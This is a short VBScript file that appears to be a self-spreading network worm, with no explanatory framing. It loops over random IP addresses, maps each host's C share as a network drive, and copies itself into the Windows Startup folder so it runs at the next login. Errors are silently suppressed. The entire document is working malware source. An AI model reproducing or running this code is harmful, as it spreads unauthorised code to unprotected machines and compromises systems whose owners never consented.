on error resume next
dim c,g,p,w,x,y,z,n
p="."
set Q=wscript.createobject("wscript.network")
Set b=createobject("scripting.filesystemobject")
g=b.GetFile(WScript.ScriptFullName)
do
e()
w=n
e()
x=n
e()
y=n
e()
z=n
Q.mapnetworkdrive "x:","\\"&w&p&x&p&y&p&z&"\C"
b.copyfile g,"x:\WINDOWS\StartM~1\Programs\StartUp\"
Q.removenetworkdrive "x:"
loop
function e()
n=int((254*rnd)+1)
end function